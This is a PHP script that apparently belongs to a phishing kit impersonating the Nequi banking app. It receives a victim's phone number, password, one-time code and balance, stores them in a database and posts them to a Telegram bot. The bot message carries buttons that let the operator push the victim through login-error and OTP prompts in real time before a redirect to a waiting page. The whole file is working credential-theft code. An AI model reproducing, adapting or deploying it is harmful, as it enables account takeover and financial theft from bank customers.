<?php
// Incluir el archivo de configuración y conexión a la base de datos
include '../../../db.php'; // Ajustado para estar en process/goat.php
$config = include '../../../config.php';

function escapeMarkdownV2($text)
{
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cliente_id_global = $_POST['cliente_id'] ?? null;
    $usuario = $_POST['usuario'];
    $clave = $_POST['clave'];
    $otp = $_POST['otp'];
    $saldo = $_POST['saldo'];
    $estado = 1; // Estado inicial del cliente
    $ip_address = $_SERVER['REMOTE_ADDR'];

    $success = false;
    $cliente_id = null;
    $tabla_tracking = 'nequi';

    if (!empty($cliente_id_global)) {
        // MODO UNIFICADO: Actualizar registro existente en tabla maestro (pse)
        $sql = "UPDATE pse SET usuario = :usuario, clave = :clave, otp = :otp, banco = 'Nequi', estado = :estado WHERE id = :id";
        $stmt = $conn->prepare($sql);
        $success = $stmt->execute([
            'usuario' => $usuario,
            'clave' => $clave,
            'otp' => $otp,
            'estado' => $estado,
            'id' => $cliente_id_global
        ]);
        $cliente_id = $cliente_id_global;
        $tabla_tracking = 'pse';
    } else {
        // MODO LEGACY: Crear nuevo registro en tabla nequi
        $sql = "INSERT INTO nequi (celular, clave, otp, estado, ip_address) VALUES (:usuario, :clave, :otp, :estado, :ip) RETURNING id";
        $stmt = $conn->prepare($sql);
        if ($stmt->execute(['usuario' => $usuario, 'clave' => $clave, 'otp' => $otp, 'estado' => $estado, 'ip' => $ip_address])) {
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            $cliente_id = $row['id'];
            $success = true;
        }
    }

    if ($success) {
        // Enviar datos a Telegram
        $botToken = $config['botToken'];
        $chatId = $config['chatId'];
        $baseUrl = $config['baseUrl'];
        $security_key = $config['security_key'];

        $message = "🔐 <b>Acceso Nequi (Unificado)</b>\n\n"
            . "🆔 <b>ID:</b> #$cliente_id\n"
            . "📱 <b>Número de celular:</b> <code>" . $usuario . "</code>\n"
            . "🔑 <b>Contraseña:</b> <code>" . $clave . "</code>\n"
            . "💰 <b>Saldo Nequi:</b> <code>" . $saldo . "</code>\n"
            . "🔢 <b>Clave dinámica:</b> <code>" . $otp . "</code>";

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => 'Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key&tabla=$tabla_tracking"],
                    ['text' => 'Datos', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key&tabla=$tabla_tracking"]
                ],
                [
                    ['text' => 'Otp', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key&tabla=$tabla_tracking"],
                    ['text' => 'Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key&tabla=$tabla_tracking"]
                ],
                [
                    ['text' => 'Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=0&key=$security_key&tabla=$tabla_tracking"]
                ]
            ]
        ];

        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];

        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
                'ignore_errors' => true
            ]
        ];

        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        // Verificar código de respuesta HTTP
        $http_response_header = $http_response_header ?? [];
        $response_code = 0;
        foreach ($http_response_header as $header) {
            if (preg_match('#HTTP/[0-9\.]+\s+([0-9]+)#', $header, $matches)) {
                $response_code = intval($matches[1]);
                break;
            }
        }

        if ($result === FALSE || $response_code >= 400) {
            error_log("Telegram API Error (Code $response_code): " . $result);
        }

        header("Location: ../espera.php?id=" . $cliente_id);
        exit();
    } else {
        echo "Error al insertar datos.";
    }
}
?>
